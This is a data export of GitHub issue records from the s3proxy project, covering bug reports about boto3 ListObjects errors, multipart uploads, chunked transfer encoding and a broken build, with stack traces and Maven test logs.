",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/138/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/138/comments,https://api.github.com/repos/gaul/s3proxy/issues/138/events,https://github.com/gaul/s3proxy/issues/138,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/137,158962565,MDU6SXNzdWUxNTg5NjI1NjU=,137,boto3  client.list_objects fails with botocore.exceptions.ClientError when using against s3proxy,7120158,closed,FALSE,NA,NA,4,2016-06-07T16:06:03Z,2016-06-07T18:50:02Z,2016-06-07T18:50:02Z,NONE,NA,"Not sure if I'm missing something obvious, but the same code works fine against 'the real s3'... Steps to reproduce:

```
import boto3

session = boto3.session.Session(aws_access_key_id='access', aws_secret_access_key='supersecret')
config = boto3.session.Config(s3={'addressing_style': 'path'})

# low level S3 client
client = session.client('s3', endpoint_url='http://localhost:5000', config=config)

# List Keys
for key in client.list_objects(Bucket='mahbucket')['Contents']:
    print key
```

Stacktrace:

```
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/usr/local/lib/python2.7/site-packages/botocore/client.py"", line 258, in _api_call
    return self._make_api_call(operation_name, kwargs)
  File ""/usr/local/lib/python2.7/site-packages/botocore/client.py"", line 548, in _make_api_call
    raise ClientError(parsed_response, operation_name)
botocore.exceptions.ClientError: An error occurred (NotImplemented) when calling the ListObjects operation: A header you provided implies functionality that is not implemented.
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/137/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/137/comments,https://api.github.com/repos/gaul/s3proxy/issues/137/events,https://github.com/gaul/s3proxy/issues/137,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/136,158031350,MDU6SXNzdWUxNTgwMzEzNTA=,136,S3Proxy User-Agent,848247,closed,FALSE,NA,NA,0,2016-06-01T23:45:48Z,2017-02-27T17:49:12Z,2017-02-27T17:49:12Z,OWNER,NA,"Presently S3Proxy sends `jclouds/2.0.0-SNAPSHOT java/1.8.0_91` for its User-Agent header.  S3Proxy should prepend its name as well.  Needs jclouds support tracked by [JCLOUDS-819](https://issues.apache.org/jira/browse/JCLOUDS-819).
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/136/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/136/comments,https://api.github.com/repos/gaul/s3proxy/issues/136/events,https://github.com/gaul/s3proxy/issues/136,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/135,157708145,MDU6SXNzdWUxNTc3MDgxNDU=,135,Broken multipart upload on systems without extended attributes,1567457,closed,FALSE,NA,NA,12,2016-05-31T15:59:20Z,2016-09-22T15:42:59Z,2016-06-01T20:11:25Z,NONE,NA,"I build s3proxy from sources and whenever I try to upload a large file I get the following failure:
`A client error (Unknown) occurred when calling the CompleteMultipartUpload operation: Unknown`
The destination remains empty after that (even from hidden files).
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/135/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/135/comments,https://api.github.com/repos/gaul/s3proxy/issues/135/events,https://github.com/gaul/s3proxy/issues/135,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/134,153354926,MDU6SXNzdWUxNTMzNTQ5MjY=,134,Return a more coherent error if Transfer-Encoding: chunked is set,703870,open,FALSE,NA,NA,1,2016-05-06T00:28:49Z,2016-05-06T00:30:41Z,NA,CONTRIBUTOR,NA,"AWS S3 v2 signature method does not allow for chunked uploads (setting Transfer-Encoding: chunked). I discovered (through the virtue of a buggy library), that submitting a chunked request to S3Proxy results in:

```
W 05-05 17:27:54.408 S3Proxy-17 o.e.jetty.http.HttpParser:1355 |::] badMessage: java.lang.NumberFormatException: !hex 35 for HttpChannelOverHttp@6245f4b9{r=4,c=false,a=DISPATCHED,uri=/timur-test/AUTH_test/test/-bash_logout}
W 05-05 17:27:54.411 S3Proxy-17 o.e.jetty.server.HttpChannel:396 |::] /timur-test/AUTH_test/test/-bash_logout
java.lang.IllegalStateException: s=DISPATCHED i=true a=null
    at org.eclipse.jetty.server.HttpChannelState.handling(HttpChannelState.java:232)
    at org.eclipse.jetty.server.HttpChannel.badMessage(HttpChannel.java:724)
    at org.eclipse.jetty.server.HttpConnection$HttpChannelOverHttp.badMessage(HttpConnection.java:529)
    at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:1362)
    at org.eclipse.jetty.server.HttpConnection.parseContent(HttpConnection.java:305)
    at org.eclipse.jetty.server.HttpInputOverHTTP.nextContent(HttpInputOverHTTP.java:90)
    at org.eclipse.jetty.server.HttpInputOverHTTP.nextContent(HttpInputOverHTTP.java:31)
    at org.eclipse.jetty.server.HttpInput.getNextContent(HttpInput.java:143)
    at org.eclipse.jetty.server.HttpInputOverHTTP.blockForContent(HttpInputOverHTTP.java:69)
    at org.eclipse.jetty.server.HttpInput$1.waitForContent(HttpInput.java:489)
    at org.eclipse.jetty.server.HttpInput.read(HttpInput.java:122)
    at com.google.common.hash.HashingInputStream.read(HashingInputStream.java:65)
    at java.io.FilterInputStream.read(FilterInputStream.java:107)
    at com.google.common.io.ByteStreams.copy(ByteStreams.java:175)
    at com.google.common.io.ByteStreams.toByteArray(ByteStreams.java:220)
    at org.jclouds.blobstore.TransientStorageStrategy.putBlob(TransientStorageStrategy.java:167)
```

S3Proxy should return a 501 error with the XML stating that the method is not implemented in such cases. I'll try to submit a PR for that.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/134/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/134/comments,https://api.github.com/repos/gaul/s3proxy/issues/134/events,https://github.com/gaul/s3proxy/issues/134,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/133,143280059,MDU6SXNzdWUxNDMyODAwNTk=,133,Build Broken,682040,closed,FALSE,NA,NA,6,2016-03-24T15:37:49Z,2016-03-24T19:58:55Z,2016-03-24T17:48:46Z,NONE,NA,"Looks like some updates to the jclouds 2.0 snapshot may have broken this projects ability to build.

```
Downloaded: https://repo.maven.apache.org/maven2/com/google/collections/google-collections/1.0/google-collections-1.0.jar (625 KB at 134.6 KB/sec)
Downloaded: https://repo.maven.apache.org/maven2/com/google/errorprone/error_prone_core/2.0.5/error_prone_core-2.0.5.jar (3574 KB at 578.4 KB/sec)
[INFO] Changes detected - recompiling the module!
[INFO] Compiling 8 source files to /opt/s3proxy/target/classes
/root/.m2/repository/org/apache/jclouds/driver/jclouds-slf4j/2.0.0-SNAPSHOT/jclouds-slf4j-2.0.0-SNAPSHOT.jar(org/jclouds/logging/slf4j/config/SLF4JLoggingModule.class): warning: Cannot find annotation method 'value()' in type 'AutoService': class file for com.google.auto.service.AutoService not found
1 warning
[INFO]
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ s3proxy ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 5 resources
[INFO]
[INFO] --- maven-compiler-plugin:3.3:testCompile (default-testCompile) @ s3proxy ---
[INFO] Changes detected - recompiling the module!
[INFO] Compiling 8 source files to /opt/s3proxy/target/test-classes
/root/.m2/repository/org/apache/jclouds/driver/jclouds-slf4j/2.0.0-SNAPSHOT/jclouds-slf4j-2.0.0-SNAPSHOT.jar(org/jclouds/logging/slf4j/config/SLF4JLoggingModule.class): warning: Cannot find annotation method 'value()' in type 'AutoService': class file for com.google.auto.service.AutoService not found
/root/.m2/repository/com/google/guava/guava/16.0.1/guava-16.0.1.jar(com/google/common/util/concurrent/Monitor.class): warning: Cannot find annotation method 'value()' in type 'GuardedBy': class file for javax.annotation.concurrent.GuardedBy not found
/root/.m2/repository/com/google/guava/guava/16.0.1/guava-16.0.1.jar(com/google/common/util/concurrent/Monitor.class): warning: Cannot find annotation method 'value()' in type 'GuardedBy'
/root/.m2/repository/com/google/guava/guava/16.0.1/guava-16.0.1.jar(com/google/common/util/concurrent/Monitor.class): warning: Cannot find annotation method 'value()' in type 'GuardedBy'
/root/.m2/repository/com/google/guava/guava/16.0.1/guava-16.0.1.jar(com/google/common/util/concurrent/Monitor.class): warning: Cannot find annotation method 'value()' in type 'GuardedBy'
/root/.m2/repository/com/google/guava/guava/16.0.1/guava-16.0.1.jar(com/google/common/util/concurrent/Monitor.class): warning: Cannot find annotation method 'value()' in type 'GuardedBy'
/root/.m2/repository/com/google/guava/guava/16.0.1/guava-16.0.1.jar(com/google/common/util/concurrent/Monitor.class): warning: Cannot find annotation method 'value()' in type 'GuardedBy'
/root/.m2/repository/com/google/guava/guava/16.0.1/guava-16.0.1.jar(com/google/common/util/concurrent/Monitor.class): warning: Cannot find annotation method 'value()' in type 'GuardedBy'
/root/.m2/repository/com/google/guava/guava/16.0.1/guava-16.0.1.jar(com/google/common/util/concurrent/Monitor.class): warning: Cannot find annotation method 'value()' in type 'GuardedBy'
/root/.m2/repository/com/google/guava/guava/16.0.1/guava-16.0.1.jar(com/google/common/util/concurrent/Monitor.class): warning: Cannot find annotation method 'value()' in type 'GuardedBy'
10 warnings
[INFO]
[INFO] --- maven-surefire-plugin:2.19.1:test (default-test) @ s3proxy ---
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-junit47/2.19.1/surefire-junit47-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-junit47/2.19.1/surefire-junit47-2.19.1.pom (7 KB at 67.6 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-providers/2.19.1/surefire-providers-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-providers/2.19.1/surefire-providers-2.19.1.pom (3 KB at 34.3 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit48/2.19.1/common-junit48-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit48/2.19.1/common-junit48-2.19.1.pom (4 KB at 40.1 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit4/2.19.1/common-junit4-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit4/2.19.1/common-junit4-2.19.1.pom (3 KB at 28.9 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit3/2.19.1/common-junit3-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit3/2.19.1/common-junit3-2.19.1.pom (2 KB at 24.5 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-api/2.19.1/surefire-api-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-api/2.19.1/surefire-api-2.19.1.pom (4 KB at 50.4 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-java5/2.19.1/common-java5-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-java5/2.19.1/common-java5-2.19.1.pom (3 KB at 34.0 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/shared/maven-shared-utils/0.9/maven-shared-utils-0.9.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/shared/maven-shared-utils/0.9/maven-shared-utils-0.9.pom (7 KB at 98.1 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/shared/maven-shared-components/21/maven-shared-components-21.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/shared/maven-shared-components/21/maven-shared-components-21.pom (5 KB at 84.5 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/25/maven-parent-25.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/25/maven-parent-25.pom (37 KB at 487.5 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/apache/15/apache-15.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/apache/15/apache-15.pom (15 KB at 225.4 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-grouper/2.19.1/surefire-grouper-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-grouper/2.19.1/surefire-grouper-2.19.1.pom (3 KB at 44.2 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-testng/2.19.1/surefire-testng-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-testng/2.19.1/surefire-testng-2.19.1.pom (3 KB at 39.1 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-testng-utils/2.19.1/surefire-testng-utils-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-testng-utils/2.19.1/surefire-testng-utils-2.19.1.pom (3 KB at 46.6 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/maven-surefire-common/2.19.1/maven-surefire-common-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/maven-surefire-common/2.19.1/maven-surefire-common-2.19.1.pom (8 KB at 105.3 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-annotations/3.3/maven-plugin-annotations-3.3.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-annotations/3.3/maven-plugin-annotations-3.3.pom (2 KB at 24.1 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-tools/3.3/maven-plugin-tools-3.3.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-tools/3.3/maven-plugin-tools-3.3.pom (13 KB at 162.5 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-booter/2.19.1/surefire-booter-2.19.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-booter/2.19.1/surefire-booter-2.19.1.pom (4 KB at 41.4 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/reporting/maven-reporting-api/3.0/maven-reporting-api-3.0.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/reporting/maven-reporting-api/3.0/maven-reporting-api-3.0.pom (3 KB at 39.3 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/shared/maven-shared-components/15/maven-shared-components-15.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/shared/maven-shared-components/15/maven-shared-components-15.pom (10 KB at 136.1 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/16/maven-parent-16.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/16/maven-parent-16.pom (23 KB at 315.6 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/commons/commons-lang3/3.1/commons-lang3-3.1.pom
Downloaded: https://repo.maven.apache.org/maven2/org/apache/commons/commons-lang3/3.1/commons-lang3-3.1.pom (17 KB at 236.5 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-junit47/2.19.1/surefire-junit47-2.19.1.jar
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit48/2.19.1/common-junit48-2.19.1.jar
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit4/2.19.1/common-junit4-2.19.1.jar
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit3/2.19.1/common-junit3-2.19.1.jar
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/shared/maven-shared-utils/0.9/maven-shared-utils-0.9.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit4/2.19.1/common-junit4-2.19.1.jar (26 KB at 138.3 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-grouper/2.19.1/surefire-grouper-2.19.1.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit3/2.19.1/common-junit3-2.19.1.jar (12 KB at 60.4 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-testng/2.19.1/surefire-testng-2.19.1.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-junit48/2.19.1/common-junit48-2.19.1.jar (23 KB at 105.9 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-java5/2.19.1/common-java5-2.19.1.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/shared/maven-shared-utils/0.9/maven-shared-utils-0.9.jar (168 KB at 738.5 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-testng-utils/2.19.1/surefire-testng-utils-2.19.1.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-testng/2.19.1/surefire-testng-2.19.1.jar (42 KB at 140.5 KB/sec)
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-grouper/2.19.1/surefire-grouper-2.19.1.jar (38 KB at 127.0 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/maven-surefire-common/2.19.1/maven-surefire-common-2.19.1.jar
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-booter/2.19.1/surefire-booter-2.19.1.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-junit47/2.19.1/surefire-junit47-2.19.1.jar (150 KB at 497.7 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/codehaus/plexus/plexus-utils/1.5.15/plexus-utils-1.5.15.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/common-java5/2.19.1/common-java5-2.19.1.jar (44 KB at 132.2 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/reporting/maven-reporting-api/3.0/maven-reporting-api-3.0.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-testng-utils/2.19.1/surefire-testng-utils-2.19.1.jar (27 KB at 66.8 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/commons/commons-lang3/3.1/commons-lang3-3.1.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/reporting/maven-reporting-api/3.0/maven-reporting-api-3.0.jar (11 KB at 22.8 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-api/2.19.1/surefire-api-2.19.1.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-booter/2.19.1/surefire-booter-2.19.1.jar (45 KB at 94.7 KB/sec)
Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-annotations/3.3/maven-plugin-annotations-3.3.jar
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/maven-surefire-common/2.19.1/maven-surefire-common-2.19.1.jar (286 KB at 529.0 KB/sec)
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugin-tools/maven-plugin-annotations/3.3/maven-plugin-annotations-3.3.jar (14 KB at 20.6 KB/sec)
Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire-api/2.19.1/surefire-api-2.19.1.jar (192 KB at 265.2 KB/sec)
Downloaded: https://repo.maven.apache.org/maven2/org/apache/commons/commons-lang3/3.1/commons-lang3-3.1.jar (309 KB at 426.6 KB/sec)
Downloaded: https://repo.maven.apache.org/maven2/org/codehaus/plexus/plexus-utils/1.5.15/plexus-utils-1.5.15.jar (223 KB at 289.3 KB/sec)

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running org.gaul.s3proxy.S3ProxyTest
Tests run: 20, Failures: 0, Errors: 0, Skipped: 1, Time elapsed: 10.975 sec - in org.gaul.s3proxy.S3ProxyTest
Running org.gaul.s3proxy.S3AwsSdkTest
Tests run: 10, Failures: 0, Errors: 4, Skipped: 0, Time elapsed: 5.851 sec <<< FAILURE! - in org.gaul.s3proxy.S3AwsSdkTest
testUnicodeObject(org.gaul.s3proxy.S3AwsSdkTest)  Time elapsed: 3.542 sec  <<< ERROR!
com.amazonaws.services.s3.model.AmazonS3Exception: java.io.IOException: Content-Length mismatch, actual: 1 expected: 173 (Service: Amazon S3; Status Code: 500; Error Code: 500 java.io.IOException: Content-Length mismatch, actual: 1 expected: 173; Request ID: null)
    at org.gaul.s3proxy.S3AwsSdkTest.testUnicodeObject(S3AwsSdkTest.java:392)

testAwsV4Signature(org.gaul.s3proxy.S3AwsSdkTest)  Time elapsed: 2.209 sec  <<< ERROR!
com.amazonaws.services.s3.model.AmazonS3Exception: java.io.IOException: Content-Length mismatch, actual: 1 expected: 173 (Service: Amazon S3; Status Code: 500; Error Code: 500 java.io.IOException: Content-Length mismatch, actual: 1 expected: 173; Request ID: null)
    at org.gaul.s3proxy.S3AwsSdkTest.testAwsV4Signature(S3AwsSdkTest.java:164)

testMultipartCopy(org.gaul.s3proxy.S3AwsSdkTest)  Time elapsed: 2.193 sec  <<< ERROR!
com.amazonaws.services.s3.model.AmazonS3Exception: java.io.IOException: Content-Length mismatch, actual: 1 expected: 173 (Service: Amazon S3; Status Code: 500; Error Code: 500 java.io.IOException: Content-Length mismatch, actual: 1 expected: 173; Request ID: null)
    at org.gaul.s3proxy.S3AwsSdkTest.testMultipartCopy(S3AwsSdkTest.java:272)

testUpdateBlobXmlAcls(org.gaul.s3proxy.S3AwsSdkTest)  Time elapsed: 2.181 sec  <<< ERROR!
com.amazonaws.services.s3.model.AmazonS3Exception: java.io.IOException: Content-Length mismatch, actual: 1 expected: 173 (Service: Amazon S3; Status Code: 500; Error Code: 500 java.io.IOException: Content-Length mismatch, actual: 1 expected: 173; Request ID: null)
    at org.gaul.s3proxy.S3AwsSdkTest.testUpdateBlobXmlAcls(S3AwsSdkTest.java:370)


Results :

Tests in error:
  S3AwsSdkTest.testAwsV4Signature:164 » AmazonS3 java.io.IOException: Content-Le...
  S3AwsSdkTest.testMultipartCopy:272 » AmazonS3 java.io.IOException: Content-Len...
  S3AwsSdkTest.testUnicodeObject:392 » AmazonS3 java.io.IOException: Content-Len...
  S3AwsSdkTest.testUpdateBlobXmlAcls:370 » AmazonS3 java.io.IOException: Content...

Tests run: 30, Failures: 0, Errors: 4, Skipped: 1


-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running TestSuite
Tests run: 129, Failures: 19, Errors: 0, Skipped: 15, Time elapsed: 15.169 sec <<< FAILURE! - in TestSuite
testCopyBlobCopyMetadata(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.024 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>

testCopyBlobReplaceMetadata(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.018 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>

testCopyIfMatch(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.016 sec  <<< FAILURE!
org.jclouds.aws.AWSResponseException: request PUT http://127.0.0.1:48348/root-blobstore-7491571079735849768/to HTTP/1.1 failed with code 501, error: AWSError{requestId='4442587FB7D0A2F9', requestToken='null', code='NotImplemented', message='A header you provided implies functionality that is not implemented.'}

testCopyIfMatchNegative(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.019 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<[412]> but was:<[501]>

testCopyIfModifiedSince(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.015 sec  <<< FAILURE!
org.jclouds.aws.AWSResponseException: request PUT http://127.0.0.1:48348/root-blobstore0/to HTTP/1.1 failed with code 501, error: AWSError{requestId='4442587FB7D0A2F9', requestToken='null', code='NotImplemented', message='A header you provided implies functionality that is not implemented.'}

testCopyIfModifiedSinceNegative(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.03 sec  <<< FAILURE!
java.lang.AssertionError:

Expecting:
 <501>
to be in:
 <[304, 412]>


testCopyIfNoneMatch(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.019 sec  <<< FAILURE!
org.jclouds.aws.AWSResponseException: request PUT http://127.0.0.1:48348/root-blobstore835184202432871548/to HTTP/1.1 failed with code 501, error: AWSError{requestId='4442587FB7D0A2F9', requestToken='null', code='NotImplemented', message='A header you provided implies functionality that is not implemented.'}

testCopyIfNoneMatchNegative(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.017 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<[412]> but was:<[501]>

testCopyIfUnmodifiedSince(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.018 sec  <<< FAILURE!
org.jclouds.aws.AWSResponseException: request PUT http://127.0.0.1:48348/root-blobstore-5890954602574779503/to HTTP/1.1 failed with code 501, error: AWSError{requestId='4442587FB7D0A2F9', requestToken='null', code='NotImplemented', message='A header you provided implies functionality that is not implemented.'}

testCopyIfUnmodifiedSinceNegative(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.018 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<[412]> but was:<[501]>

testMultipartUploadMultipleParts(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 1.052 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>

testMultipartUploadSinglePart(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.022 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>

testPutByteSource(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.01 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>

testPutInputStream(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.01 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>

testPutMultipartByteSource(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 6.413 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>

testPutMultipartInputStream(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.47 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>

testPutObject(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.017 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>

testPutObject(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.025 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>

testPutObject(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)  Time elapsed: 0.013 sec  <<< FAILURE!
org.junit.ComparisonFailure: expected:<""max-age=3600""> but was:<null>


Results :

Failed tests:
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testCopyBlobCopyMetadata:895->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testCopyBlobReplaceMetadata:944->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testCopyIfMatch:967 » AWSResponse
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testCopyIfMatchNegative:1001 expected:<[412]> but was:<[501]>
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testCopyIfModifiedSince:1082 » AWSResponse
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testCopyIfModifiedSinceNegative:1119
Expecting:
 <501>
to be in:
 <[304, 412]>

  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testCopyIfNoneMatch:1024 » AWSResponse
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testCopyIfNoneMatchNegative:1058 expected:<[412]> but was:<[501]>
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testCopyIfUnmodifiedSince:1143 » AWSResponse
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testCopyIfUnmodifiedSinceNegative:1178 expected:<[412]> but was:<[501]>
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testMultipartUploadMultipleParts:1272->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testMultipartUploadSinglePart:1234->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>
